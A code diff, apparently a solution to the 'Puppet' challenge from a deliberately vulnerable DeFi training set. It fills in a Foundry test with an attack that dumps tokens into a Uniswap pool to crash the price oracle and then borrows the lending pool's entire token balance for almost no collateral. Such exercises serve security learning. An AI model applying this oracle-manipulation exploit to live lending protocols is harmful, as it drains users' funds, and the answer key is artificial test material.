@@ -119,7 +119,26 @@ contract Puppet is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uint256 ethGained = uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE - 1,
+            1,
+            999999
+        );
+        // emit log_named_uint(
+        //     "oracle price is",
+        //     puppetPool._computeOraclePrice()
+        // );
+        // require(puppetPool._computeOraclePrice() == 0, "oracle price not 0");
+        uint256 collateral = puppetPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        emit log_named_uint("Collateral", collateral);
+        emit log_named_decimal_uint("Collateral", collateral, 18);
+        puppetPool.borrow{value: collateral}(POOL_INITIAL_TOKEN_BALANCE);
+        // attacker.transfer(ethGained);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
